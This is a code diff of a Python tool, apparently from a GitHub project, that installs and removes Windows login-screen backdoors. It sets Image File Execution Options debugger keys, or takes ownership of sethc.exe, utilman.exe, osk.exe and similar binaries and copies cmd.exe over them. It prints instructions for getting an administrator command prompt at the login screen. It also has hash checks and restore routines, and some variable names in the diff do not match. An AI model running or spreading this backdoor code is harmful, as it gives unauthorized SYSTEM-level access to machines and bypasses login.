@@ -1,9 +1,9 @@
 import os
 import winreg
-from hash import calculate_sha256
-from config import header, bar
+from config import *
 
 def install_registry_backdoor(path):
+    print(bar)
     fileName = os.path.basename(path).strip(' ')
     print("Adding " + fileName + " backdoor to registry.")
     try:
@@ -20,51 +20,128 @@ def install_registry_backdoor(path):
         return
     print(fileName + " debugger registry key successfully added.")
 
-# TODO: use takeown.exe and icacls.exe to take ownership/perms away from TrustedInstaller
+
+def install_backdoor(filePath, registryPath):
+    print(bar)
+    fileName = os.path.basename(filePath).strip(' ')
+    while True:
+        print("Would you like to install debugger key for cmd.exe in the registry,\nCopy cmd.exe over " + fileName + ", or both?")
+        print("[A]dd debugger key for cmd.exe.")
+        print("[C]opy " + fileName + " over with cmd.exe")
+        print("[B]oth.")
+        print("[R]eturn to Main Menu.")
+        choice = input("[>]").lower()
+        if choice == 'a':
+            install_registry_backdoor(registryPath)
+            return
+        elif choice == 'c':
+            replace_file(filePath)
+            return
+        elif choice == 'b':
+            install_registry_backdoor(registryPath)
+            replace_file(filePath)
+            return
+        elif choice == 'm':
+            return
+        else:
+            print("Invalid Input.")
+
+# TODO: Perform initial backup of
 def replace_file(path):
     print(bar)
     fileName = os.path.basename(path).strip(' ')
     print("WARNING: This will copy over " + fileName + "!")
 
-    print("Backing up " + fileName + " to the current directory.  You can restore from backup by doing [R]emove Backdoor option from the Main Menu.")
-    try:
-        os.system("copy " + path)
-    except Exception as e:
-        print(e)
+    print("Backing up " + fileName + " to the current directory.\nYou can restore from backup by doing [R]emove Backdoor option from the Main Menu.")
+    calculate_sha256(path)
+    if(sha_is_incorrect(path)):
+        print("Since " + fileName + " has been replaced, the backup cannot be completed.")
         return
+    else:
+        try:
+            os.system("copy " + path)
+        except Exception as e:
+            print(e)
+            return
+
     print("Replacing " + fileName + " with cmd.exe.")
     try:
         print("Granting Administrators full privilege on " + fileName)
-        os.system('TAKEOWN /F "' + path + '"')
+        os.system('TAKEOWN /a /F "' + path + '"')
         os.system('icacls.exe "' + path + '" /grant Administrators:F')
         print("Copying cmd.exe over " + fileName)
         os.system("copy " + cmdPath + " " + path)
+
     except Exception as e:
         print(e)
         return
+
+
+def run_sfc():
+    while True:
+        print("Would you like to run Windows System File Checker?")
+        choice = input("[Y/N]: ").lower()
+        if choice == 'y':
+            try:
+                os.system('sfc /Scannow')
+            except Exception as e:
+                print(e)
+            return
+        elif choice == 'n':
+            return
+        else:
+            print("Incorrect input.")
+
+
+def backup_restore(path):
+    fileName = os.path.basename(path).strip(' ')
+    print("Attempting to restore " + fileName + " from local backup.")
+    if(sha_is_incorrect(path)):
+        print("Since " + fileName + " has been replaced, the restore from local backup cannot be completed.")
+        run_sfc()
+    else:
+        try:
+            os.system("copy " + fileName + " " + path)
+        except FileNotFoundError as e:
+            print(e)
+            print("File backup not found.")
+            run_sfc()
+
+    print(fileName + " backup restore was successful.")
+    sha256 = calculate_sha256(path)
+    print(fileName + " Sha256:\n" + sha256)
+
+
+def sha_is_incorrect(path):
+    fileName = os.path.basename(path).strip(' ')
+    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
+    sha256 = calculate_sha256(path)
+    print(fileName + " Sha256:\n" + sha256)
+    if (sha256 == cmdSha):
+        print(fileName + " file has been replaced with cmd.exe!")
+        print("cmd.exe Sha256:\n" + cmdSha)
+        return True
+    elif(sha256 == explorerSha):
+        print(fileName + " file has been replaced with explorer.exe!")
+        print("explorer.exe Sha256:\n" + explorerSha)
+        return True
+    elif(sha256 == powershellSha):
+        print(fileName + " file has been replaced with powershell.exe!")
+        print("powershell.exe Sha256:\n" + powershellSha)
+        return True
+    else:
+        return False
 
 def remove_backdoor(path):
     print(bar)
     fileName = os.path.basename(path).strip(' ')
-    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
-    # calculate hashes
-    sha256 = calculate_sha256(path)
-
-    if sha256 == (cmdSha or explorerSha or powershellSha):
-        print(fileName + " file has been replaced.")
-        print(fileName + " Sha256:\n" + sha256)
-        print("cmd.exe Sha256:\n" + cmdSha)
-        print("explorer.exe Sha256:\n" + explorerSha)
-        print("powershell.exe Sha256:\n" + explorerSha)
-        # TODO: provide download link
-        print("Please download a legitimate version from Microsoft.")
+    if(sha_is_incorrect(path)):
+        backup_restore(path)
     else:
         print(fileName + " hashes do not match cmd.exe, explorer.exe, or powershell.exe")
 
     print("Performing " + fileName + " registry analysis.")
-
     registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName
-
     # test if key exists
     try:
         print("Attempting to open " + fileName + " key.")
@@ -75,9 +152,8 @@ def remove_backdoor(path):
 
     # key was found
     print(fileName + " backdoor debugger registry entry found, attempting to remove.")
-    cmd = ('REG DELETE "HKLM\\' + registryPath + '" /f')
     try:
-        os.system(cmd)
+        os.system('REG DELETE "HKLM\\' + registryPath + '" /f')
     except Exception as e:
         print(e)
         return
@@ -87,26 +163,6 @@ def remove_backdoor(path):
 if __name__ == "__main__":
     print(header)
     # get the current drive name
-    drive = os.getenv('SystemDrive')
-    sethcPath = (drive + '\windows\system32\sethc.exe ')
-    sethcRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe')
-    utilmanPath = (drive + '\windows\system32\\utilman.exe ')
-    utilmanRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\utilman.exe')
-    narratorPath = (drive + '\windows\system32\\narrator.exe ')
-    narratorRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\narrator.exe')
-    oskPath = (drive + '\windows\system32\osk.exe ')
-    oskRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe')
-    magnifyPath = (drive + '\windows\system32\magnify.exe ')
-    magnifiyRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe')
-    displayswitchPath = (drive + '\windows\system32\displayswitch.exe ')
-    displayswitchRegistryPath = ('SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\displayswitch.exe')
-
-    cmdPath = (drive + '\windows\system32\cmd.exe ')
-    explorerPath = (drive + '\windows\explorer.exe ')
-    powershellPath = (drive + '\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe')
-    cmdSha = calculate_sha256(cmdPath)
-    explorerSha = calculate_sha256(explorerPath)
-    powershellSha = calculate_sha256(powershellPath)
 
     while True:
         print(bar)
@@ -123,45 +179,45 @@ if __name__ == "__main__":
             print("[M]agnifier (magnify.exe).")
             print("[N]arrator (narrator.exe).")
             print("[O]n-Screen Keyboard (osk.exe).")
-            print("[R]eplace.")
             print("[A]ll.")
             print("[R]eturn to the Main Menu.")
             choice = input("[>]").lower()
             if choice == 's':
-                print("At the login screen, press [Shift 5 times] to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(sethcRegistryPath)
+                print("At the login screen, press [Shift 5 times]\nto open command prompt with Administrator Privileges.")
+                install_backdoor(sethcPath, sethcRegistryPath)
             elif choice == 'u':
-                print("At the login screen, press [Windows Key + U] to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(utilmanRegistryPath)
+                print("At the login screen, press [Windows Key + U]\nto open command prompt with Administrator Privileges.")
+                install_backdoor(utilmanPath, utilmanRegistryPath)
             elif choice == 'd':
-                print("At the login screen, press [Windows Key + P] to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(displayswitchRegistryPath)
+                print("At the login screen, press [Windows Key + P]\nto open command prompt with Administrator Privileges.")
+                install_backdoor(displaySwitcherPath, displaySwitcherRegistryPath)
             elif choice == 'm':
-                print("At the login screen, press [Windows Key + U] and select Magnify to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(magnifiyRegistryPath)
+                print("At the login screen, press [Windows Key + U]\nand select 'Magnify' to open command prompt\nith Administrator Privileges.")
+                install_backdoor(magnifierPath, magnifierRegistryPath)
             elif choice == 'n':
-                print("At the login screen, press [Windows Key + U] and select Narrator to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(displayswitchRegistryPath)
+                print("At the login screen, press [Windows Key + U]\nand select 'Narrator' to open command prompt\nwith Administrator Privileges.")
+                install_backdoor(narratorPath, narratorRegistryPath)
             elif choice == 'o':
-                print("At the login screen, press [Windows Key + U] and select On-Screen Keyboard to open command prompt with Administrator Privileges.")
-                install_registry_backdoor(displayswitchRegistryPath)
+                print("At the login screen, press [Windows Key + U]\nand select 'On-Screen Keyboard' to open command\nprompt with Administrator Privileges.")
+                install_backdoor(oskPath, oskRegistryPath)
             # NOTE: Does not install utilman.exe backdoor, as that would disallow access to the
             # narrator.exe, osk.exe, and magnify.exe backdoors.
             elif choice == 'a':
-                print("""At the login screen, to open the command prompt with Administrator Privileges,
+                print(
+"""At the login screen, to open the command prompt with Administrator Privileges,
 Perform any of the following:
 [Shift 5 times]
 [Windows Key + U] and select Narrator
 [Windows Key + U] and select On-Screen Keyboard
 [Windows Key + U] and select Magnify
 [Windows Key + P]""")
-                install_registry_backdoor(sethcRegistryPath)
-                install_registry_backdoor(narratorRegistryPath)
-                install_registry_backdoor(oskRegistryPath)
-                install_registry_backdoor(magnifiyRegistryPath)
-                install_registry_backdoor(displayswitchRegistryPath)
+                install_backdoor(sethcPath, sethcRegistryPath)
+                install_backdoor(displaySwitcherPath, displaySwitcherRegistryPath)
+                install_backdoor(magnifierPath, magnifierRegistryPath)
+                install_backdoor(narratorPath, narratorRegistryPath)
+                install_backdoor(oskPath, oskRegistryPath)
             elif choice == 'r':
-                replace_file(narratorPath)
+                continue
             else:
                 print("Incorrect input.")
                 continue
@@ -171,12 +227,13 @@ Perform any of the following:
             remove_backdoor(utilmanPath)
             remove_backdoor(narratorPath)
             remove_backdoor(oskPath)
-            remove_backdoor(magnifyPath)
-            remove_backdoor(displayswitchPath)
+            remove_backdoor(magnifierPath)
+            remove_backdoor(displaySwitcherPath)
         elif choice == 'c':
             print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
             print("[D]isable Windows accessibility options in registry. (doesnt work)")
             print("[E]nable Windows accessibility options in registry. (doesnt work)")
+            print("[P]erform backup restore.")
             print("[R]eturn to the Main Menu.")
             choice = input("[>]").lower()
             # TODO: Registry files do not work
@@ -184,6 +241,13 @@ Perform any of the following:
                 os.system("AccessibilityOFF.reg")
             elif choice == 'e':
                 os.system("AccessibilityON.reg")
+            elif choice == 'p':
+                backup_restore(sethcPath)
+                backup_restore(utilmanPath)
+                backup_restore(narratorPath)
+                backup_restore(oskPath)
+                backup_restore(magnifierPath)
+                backup_restore(displaySwitcherPath)
             elif choice == 'r':
                 continue
             else:
